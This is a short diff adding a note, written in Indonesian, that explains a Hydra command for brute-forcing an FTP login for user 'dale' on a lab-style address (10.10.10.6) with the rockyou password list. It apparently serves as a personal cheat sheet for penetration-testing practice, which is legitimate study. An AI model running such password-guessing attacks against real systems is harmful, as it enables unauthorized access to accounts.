@@ -1,0 +1,7 @@
+#hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp
+
+-t 4 : jumlah koneksi paralel per target
+-l : nama user
+-P : dir wordlist
+-vV : super verbose (show username + passwd)
+
